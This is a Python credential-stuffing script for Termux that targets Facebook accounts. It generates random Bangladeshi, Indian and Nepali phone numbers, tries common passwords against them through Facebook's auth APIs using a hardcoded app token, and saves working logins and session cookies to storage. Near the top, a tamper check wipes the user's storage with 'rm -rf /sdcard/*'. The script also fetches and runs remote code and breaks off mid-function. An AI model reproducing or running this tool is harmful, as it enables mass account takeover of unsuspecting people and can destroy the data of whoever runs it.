
"script owner YousuF"
#[<───────────[IMPORT-SYS]──────────────>]#
import uuid
import os,sys,time
import datetime,json
import random,string,re
import shutil,uuid,urllib
import zlib,subprocess,bs4
import os, platform, time, sys
import requests,mechanize,rich
from string import *
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")
time.sleep(2)
os.system('git pull --quiet 2>/dev/null')
#[<───────────[CAPTURE->P]──────────────>]#
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[<>] KI RE KHANKIR POLA SDCARD CK DE ðŸ«¶ðŸ¥¹')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[<>] KI RE KHANKIR POLA SDCARD CK DE ðŸ«¶ðŸ¥¹')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[<>] KI RE KHANKIR POLA SDCARD CK DE ðŸ«¶ðŸ¥¹')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[<>] KI RE KHANKIR POLA SDCARD CK DE ðŸ«¶ðŸ¥¹')
#[<───────────[IMPORT]──────────────>]#
princp=[]
usr=[]
loop = 0
oks = []
cps = []
twf = []
user = []
ugen = []
method = []
password = []
android_models=[]
ver ='\033[92;1m8.0\033[93;1m'
#[<───────────[COLOUR]─────────────>]#
B = "\033[0;30m"#BLACK
R = "\033[0;31m"#RED
LR = "\033[1;31m"#LIGHT_RED
G = "\033[0;32m"#GREEN
LG = "\033[1;32m"#LIGHT_GREEN
BR = "\033[0;33m"#BROWN
BL = "\033[0;34m"#BLUE
LB = "\033[1;34m"#LIGHT_BLUE
PU = "\033[0;35m"#PURPLE
LP = "\033[1;35m"#LIGHT_PURPLE
CY = "\033[0;36m"#CYAN
LC = "\033[1;36m"#LIGHT_CYAN
LI = "\033[0;37m"#LIGHT_GRAY
DA = "\033[1;30m"#DARK_GRAY
YE = "\033[1;33m"#YELLOW
Y = '\x1b[1;93m' #YELLOW 
W = '\x1b[1;97m' #WHITE 
LW = "\033[1;37m"#LIGHT_WHITE  
BO = "\033[1m"#BOLD
FA = "\033[2m"#FAINT
IT = "\033[3m"#ITALIC
UN = "\033[4m"#UNDERLINE
BLI = "\033[5m"#BLINK
NE = "\033[7m"#NEGATIVE
CR = "\033[9m"#CROSSED
END = "\033[0m"#END
S = '\x1b[1;96m' #sky_blue 
#[<───────────[SIM,ID]─────────────>]#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        sim_id+=fbcr
        else:
                fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                sim_id+=fbcr
except:
        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#[<─────────[USER-AGENT,SRVR]───────────>]#
uaxx = requests.get('https://raw.githubusercontent.com/MORSHED-404/MORSHED-404/main/version.txt').text
useragente = str(uaxx)

#[<───────────[USER-AGENT]─────────────>]#
def YousuF1():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';{useragente}'
        return ua    
def YousuF2():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';Dalvik/2.1.0 (Linux; U; Android 7; LG-H735 Build/OPM1.171019.022.A1) [FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/234040255;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]'
        return ua   
#[<───────────[LOGO,INFO]─────────────>]#    
sys.stdout.write('\x1b]2;  YousuF \x07')
try:os.mkdir('/sdcard/YousuF')
except:pass
logo = (f"""\033[92;1m 
\x1b[38;5;46m███████╗██╗   ██╗ ██████╗ ██████╗ 
\x1b[38;5;47m██╔════╝╚██╗ ██╔╝██╔════╝██╔═══██╗
\x1b[38;5;48m███████╗ ╚████╔╝ ██║     ██║   ██║
\x1b[38;5;49m╚════██║  ╚██╔╝  ██║     ██║   ██║
\x1b[38;5;50m███████║   ██║   ╚██████╗╚██████╔╝
\x1b[38;5;51m╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ 
                   
\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
\033[1;36m• \033[1;33mOwner		\033[1;31m:	\x1b[38;5;50mHAMZA\033[1;31m-\x1b[38;5;50mJAMEEL
\033[1;36m• \033[1;33mFB		\033[1;31m:	\x1b[38;5;49mSyco Hamza    
\033[1;36m• \033[1;33mGithub	\033[1;31m:	\x1b[38;5;48mSycohamza                 
\033[1;36m• \033[1;33mTool T	\033[1;31m:	\x1b[38;5;47mFILE\033[1;37mx\x1b[38;5;47mRANDOM
\033[1;36m• \033[1;33mVersion	\033[1;31m:	\033[1;31m(\033[1;37m0.1\033[1;31m) \x1b[1;96mULTRA
\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ """)
def linex():
        print(f"\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ """)
#[<───────────[CLEAR]─────────────>]#           
def clear():
    os.system("clear")
    print(logo)    
#[<─────────[APPROVAL,SYS]───────────>]#    
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "YOUSUF"+"M".join(uuid)
  clear()
  try: 
    httpCaht = requests.get("https://github.com/Sycohamza/Sycomunda.git").text 
    if id in httpCaht: 
      print("\033[1;36m• \033[1;37m ━\x1b[1;92m YOUR KEY IS APPROVED")
      msg = str(os.geteuid()) 
      time.sleep(0.4) 
      pass 
    else: 
      print('\033[1;36m• \033[1;37m ━\x1b[1;92m YOUR KEY IS NOT \033[91;1mAPPROVED ')
      linex()
      print(f"\033[1;36m• \033[1;37m ━\x1b[1;92m YOUR KEY : " + id)
      linex()
      input('\033[1;36m• \033[1;37m ━\x1b[1;92m PRESS ENTER TO SEND KEY TO \33[1;37mADMIN \33[0;30m ')
      os.system("xdg-open https://wa.me/+923318421707?text=" +id)
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     hoga_check()
hoga_check()
#[<─────────[MAIN,MENU]───────────>]#    
def menu():
            os.system('clear')
            print(logo)
            print('\033[1;31m(\033[1;37m1\033[1;31m) \x1b[38;5;50mFile crack')
            print('\033[1;31m(\033[1;37m2\033[1;31m) \x1b[38;5;49mFile create')
            print('\033[1;31m(\033[1;37m3\033[1;31m) \x1b[38;5;48mRandom crack')
            print('\033[1;31m(\033[1;37m4\033[1;31m) \x1b[38;5;47mPass menu')
            print('\033[1;31m(\033[1;37m5\033[1;31m) \x1b[38;5;46mTool use tutorial ')
            linex()
            xd=input(f'\033[1;36m• Choice {LR}:{LG} ')
            if xd in ['A','1']:inputfile()
            if xd in ['B','2']:os.system("git clone https://github.com/Hannan-404/FILE.git&&cd FILE&&python FILE..py")
            if xd in ['C','3']:rndm()
            if xd in ['D','4']:gmail()
            if xd in ['E','5']:passmenu()
            if xd in ['F','6']:tutorial()
            else:
            	print(f'\033[1;36m• \033[91;1m SELECT VALID OPTION ...')
            	time.sleep(2)
            	menu()    
#[<─────────[FILE,SYS]───────────>]#    
def inputfile():
                clear()
                print('\033[1;36m•\033[1;37m ━\x1b[1;92mExample:\033[1;37m /sdcard/REX.txt ')
                linex()            
                file = input(f'\033[1;36m•\033[1;37m ━\x1b[1;92mPUT\033[1;37m FILE\x1b[1;92m PATH{LR} :{LG} ')
                try:
                    fo = open(file,'r').read().splitlines()                    
                except FileNotFoundError:
                    print(f'\033[1;36m• \033[1;37m ━\033[91;1m FILE lOCATION NOT FOUND ')
                    time.sleep(2)
                    os.system('clear')
                    print(logo)
                    print(f'\033[1;36m• \033[1;37m ━\033[91;1m TRY AGAIN')
                    time.sleep(2)
                    inputfile()
#[<─────────[FILE,M,SYS]───────────>]#    
                clear()
                print(f'{LR}({LW}1{LR})\033[92;1m━─\x1b[38;5;47m METHO\033[92;1mD {LR}[\033[1;30m-{LW}FAST\033[1;30m-{LR}] ')
             #   print(f'{LR}({LW}2{LR})\033[92;1m━─\x1b[38;5;47m METHO\033[92;1mD {LR}[\033[1;30m-{LW}BEST\033[1;30m-{LR}] ')
              #  print(f'{LR}({LW}3{LR})\033[92;1m━─\x1b[38;5;47m METHO\033[92;1mD {LR}[\033[1;30m-{LW}TEST\033[1;30m-{LR}] ')
                linex()
                mthd=input(f'\033[1;36m• \033[1;37m SELECT METHOD :\033[92;1m ')                                                
                plist = []
                clear()
                try:
                    print(f'\033[1;36m•\033[1;37m ━\x1b[1;92m password Limit\033[1;37m ━{LG} Minimum{LR}[{LW}1{LR}]{LG} Maximum{LR}[{LW}30{LR}] ')
                    linex()
                    ps_limit = int(input(f'\033[1;36m•\033[1;37m ━\x1b[1;92m How many passwords do you want to add \033[91;1m?\033[92;1m '))
                except:
                    ps_limit =1
                clear()
                print(f'\033[1;36m•\033[1;37m ━ \x1b[1;92mEXAMPLE{LR}: {LG}first last{LR}<>{LG}first123{LR}<>{LG}last123{LR} >{LW}Etc')
                linex()
                for i in range(ps_limit):
                    plist.append(input(f'\033[1;36m•\033[1;37m ━\x1b[1;92m Put password {LR}({LW}{i+1}{LR}) : {LG}'))
                    linex()
                clear()
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('\033[1;36m•\033[1;37m ━\x1b[1;92m FILE CLONE  ')
                    linex()
                    print('\033[1;36m•\033[1;37m ━\x1b[1;92m TOTAL ID ─────────\033[38;5;46m➤ \033[1;37m ' +total_ids+f' \033[1;37m')
                    print('\033[1;36m•\033[1;37m ━\x1b[1;92m TRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
                    linex()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mthd in ['1','A']:crack_submit.submit(crack_file_A,ids,names,passlist)                         
                        if mthd in ['B','2']:print('Choice M1 Method 2 verry coming soon');inputfile()
                       # if mthd in ['3','C']:crack_submit.submit(graph2,ids,names,passlist)                                                   
                      #  if mthd in ['4','D']:crack_submit.submit(bapi,ids,names,passlist)                                                   
                print('\033[1;37m')
                linex()
                print(f'\033[1;36m• \x1b[1;92mTHE PROCESS HAS COMPLETED ')
                print(f'\033[1;36m• \x1b[1;92mTOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(f'\033[1;36m• \x1b[1;92mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
                menu()
#[<─────────[RND,SYS]───────────>]#     
def rndm():
	clear()
	print(f'{LR}({LW}1{LR})\033[92;1m━─\x1b[38;5;47m BD  CRAC\033[1;37mK ')
	print(f'{LR}({LW}2{LR})\033[92;1m━─\x1b[38;5;48m IND CRAC\033[1;37mK ')
	print(f'{LR}({LW}3{LR})\033[92;1m━─\x1b[38;5;49m NEP CRAC\033[1;37mK ')
	print(f'{LR}({LW}4{LR})\033[92;1m━─\x1b[38;5;50m AFR CRAC\033[1;37mK ')
	print(f'{LR}({LW}0{LR})\033[92;1m──\033[38;5;46m➤ B\033[92;1m-\033[1;37mAC\033[92;1m-\x1b[1;92mK ')
	linex()
	crk=input(f'\033[1;36m• \033[1;37m Choice {LR}:{LG} ')
	if crk =='1':
		YousuFm.bd()
	elif crk =='2':
		YousuFm.ind()
	elif crk =='3':
		YousuFm.nepal()		
	elif crk =='4':
		print('coming soon');exit()
	elif crk =='5':
		menu()
	else:
		print(f'\033[1;36m•  SELECT VALID OPTION ');time.sleep(1.5);rndm()
#[<─────────[BD,S]─────────>]#     
class YousuFm:
    def bd():
        clear()
        print('\033[1;36m• \x1b[1;92mBD SIM CODE :\033[1;92m 017 - 018 - 019 - 016')
        linex()
        code = input(f'\033[1;36m• \x1b[1;92mSELECT SIM CODE {LR} :{LG} ')
        clear()
        print('\033[1;36m• \x1b[1;92mExample: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
        linex()
        limit = int(input(f'\033[1;36m• \x1b[1;92mENTER YOUR LIMIT{LR} :{LG} '))
        linex()
        for n in range(limit):
            YMEx = "".join(random.choice(string.digits) for _ in range(8))
            user.append(YMEx)
        with tred(max_workers=30) as YousuF_M:
            tl = str(len(user))
            clear()
            print('\033[1;36m• \x1b[1;92mRANDOM CLONE\033[1;31m [\033[1;37mBD\033[1;31m] ')
            linex()
            print(f"\033[1;36m• \x1b[1;92mSIM CODE \33[1;33m		:\33[1;37m {code} \033[1;37m")
            print(f"\033[1;36m• \x1b[1;92mTOTAL ACCOUNTS\33[1;33m	:\33[1;37m {tl}")
            print('\033[1;36m• \x1b[1;92mTRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
            linex()
            for love in user:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nusrat','maliha','jannat','i love u','yousuf','Wiliam']
                YousuF_M.submit(crack_rand,ids,passlist)
        print('')
        linex()
        print(f'\033[1;36m• \x1b[1;92mTHE PROCESS HAS COMPLETED ')
        print(f'\033[1;36m• \x1b[1;92mTOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(f'\033[1;36m• \x1b[1;92mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
        main()
#[<─────────[INDIA,S]──────────>]#     
    def ind():
        clear()
        print('\033[1;36m• \x1b[1;92mIND SIM CODE :\033[1;92m +91789 - +91720 - +91730 ')
        linex()
        code = input(f'\033[1;36m• \x1b[1;92mSELECT SIM CODE {LR} :{LG} ')
        clear()
        print('\033[1;36m• \x1b[1;92mExample: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
        linex()
        limit = int(input(f'\033[1;36m• \x1b[1;92mENTER YOUR LIMIT{LR} :{LG} '))
        linex()
        for n in range(limit):
            YMEx = "".join(random.choice(string.digits) for _ in range(7))
            user.append(YMEx)
        with tred(max_workers=30) as YousuF_M:
            tl = str(len(user))
            clear()
            print('\033[1;36m• \x1b[1;92mRANDOM CLONE\033[1;31m [\033[1;37mIND\033[1;31m] ')
            linex()
            print(f"\033[1;36m• \x1b[1;92mSIM CODE \33[1;33m		:\33[1;37m {code} \033[1;37m")
            print(f"\033[1;36m• \x1b[1;92mTOTAL ACCOUNTS\33[1;33m	:\33[1;37m {tl}")
            print('\033[1;36m• \x1b[1;92mTRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
            linex()
            for love in user:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'muna123','57273200','5903200','5757751','57575752']
                YousuF_M.submit(crack_rand,ids,passlist)
        print('')
        linex()
        print(f'\033[1;36m• \x1b[1;92mTHE PROCESS HAS COMPLETED ')
        print(f'\033[1;36m• \x1b[1;92mTOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(f'\033[1;36m• \x1b[1;92mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
        main()
#[<─────────[NEPAL,S]──────────>]#     
    def nepal():
        clear()
        print('\033[1;36m• \x1b[1;92mNEP SIM CODE :\033[1;92m 9840 - 9814 - 9861 - 9815 ')
        linex()
        code = input(f'\033[1;36m• \x1b[1;92mSELECT SIM CODE {LR} :{LG} ')
        clear()
        print('\033[1;36m• \x1b[1;92mExample: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
        linex()
        limit = int(input(f'\033[1;36m• \x1b[1;92mENTER YOUR LIMIT{LR} :{LG} '))
        linex()
        for n in range(limit):
            YMEx = "".join(random.choice(string.digits) for _ in range(6))
            user.append(YMEx)
        with tred(max_workers=30) as YousuF_M:
            tl = str(len(user))
            clear()
            print('\033[1;36m• \x1b[1;92mRANDOM CLONE\033[1;31m [\033[1;37mNEP\033[1;31m] ')
            linex()
            print(f"\033[1;36m• \x1b[1;92mSIM CODE \33[1;33m		:\33[1;37m {code} \033[1;37m")
            print(f"\033[1;36m• \x1b[1;92mTOTAL ACCOUNTS\33[1;33m	:\33[1;37m {tl}")
            print('\033[1;36m• \x1b[1;92mTRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
            linex()
            for love in user:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'maya123','maya1234','maya@123','maya@1234','sujata','asha123','nepal123','nepal@123','kathmandu','muna123','pokhara','hetauda','kathmandu123','pokhara123','tamang','lama123']
                YousuF_M.submit(crack_rand,ids,passlist)
        print('')
        linex()
        print(f'\033[1;36m• \x1b[1;92mTHE PROCESS HAS COMPLETED ')
        print(f'\033[1;36m• \x1b[1;92mTOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(f'\033[1;36m• \x1b[1;92mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
        main()
#[<─────────[AFRICA,S]──────────>]#     
    def africa():
        clear()
        print('\033[1;36m• \x1b[1;92mNEP SIM CODE :\033[1;92m 9840 - 9814 - 9861 - 9815 ')
        linex()
        code = input(f'\033[1;36m• \x1b[1;92mSELECT SIM CODE {LR} :{LG} ')
        clear()
        print('\033[1;36m• \x1b[1;92mExample: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
        linex()
        limit = int(input(f'\033[1;36m• \x1b[1;92mENTER YOUR LIMIT{LR} :{LG} '))
        linex()
        for n in range(limit):
            YMEx = "".join(random.choice(string.digits) for _ in range(6))
            user.append(YMEx)
        with tred(max_workers=30) as YousuF_M:
            tl = str(len(user))
            clear()
            print('\033[1;36m• \x1b[1;92mRANDOM CLONE\033[1;31m [\033[1;37mNEP\033[1;31m] ')
            linex()
            print(f"\033[1;36m• \x1b[1;92mSIM CODE \33[1;33m		:\33[1;37m {code} \033[1;37m")
            print(f"\033[1;36m• \x1b[1;92mTOTAL ACCOUNTS\33[1;33m	:\33[1;37m {tl}")
            print('\033[1;36m• \x1b[1;92mTRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
            linex()
            for love in user:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'maya123']
                YousuF_M.submit(crack_rand,ids,passlist)
        print('')
        linex()
        print(f'\033[1;36m• \x1b[1;92mTHE PROCESS HAS COMPLETED ')
        print(f'\033[1;36m• \x1b[1;92mTOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(f'\033[1;36m• \x1b[1;92mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
        main()
#[<─────────[RANDOM,M]───────────>]#     
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{LR}[{LG}YousuF{LR}]\033[1;37m<>\33[1;32m{LR}[{LG}M\033[1;37m1{LR}]\033[1;37m<>{LR}({LG}{loop}\033[1;37m/\33[1;32m{str(len(user))}{LR}){LG}\033[1;37m<>\33[1;32mOK{W}/{R}CP\33[1;32m:{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            "email":ids,
            "password":pas,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "logged_out_id": str(uuid.uuid4()),
            "locale": "en_US",
            "client_country_code": "US",
            "cpl": "true",
            "source": "login",
            "format": "json",
            "omit_response_on_success": "false",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            "currently_logged_in_userid" : "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head = {
            "User-Agent": YousuF2(),
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(content_lenght))}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r{G}[YousuF-OK] {uid} | {pas}')
                open('/sdcard/YousuF-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'Please Confirm Email' in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r{LG}[YousuF-OK] {uid} | {pas}')
                open('/sdcard/YousuF-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/YousuF-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:print(ids,pas)
            
#continue
        loop+=1
    except Exception as e:
        pass
		
#[<─────────[FILE,M1]───────────>]#     
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{LR}[{LG}YousuF{LR}]\033[1;37m<>\33[1;32m{LR}[{LG}M\033[1;37m1{LR}]\033[1;37m<>{LR}({LG}{loop}{LR}){LG}\033[1;37m<>\33[1;32mOK{W}/{R}CP\33[1;32m:{len(oks)}{W}/{R}{len(cps)}')
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':YousuF2(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                        	print(f'\r\33[1;37m[YousuF]-[OK]\33[1;37m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                        	coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                        	#print(f'\r\33[1;37m│[CookiE]-[OK]\33[1;32m '+coki+'\033[1;37m')              	                                               	
                        	open('/sdcard/YousuF/YousuF-FILE-COOKIE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                        	open('/sdcard/YousuF/YousuF-FILE-OK.txt','a').write(ids+'|'+pas+'\n')                
                        	oks.append(ids)
                        	break            			 
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[YousuF-2F] '+ids+' | '+pas)
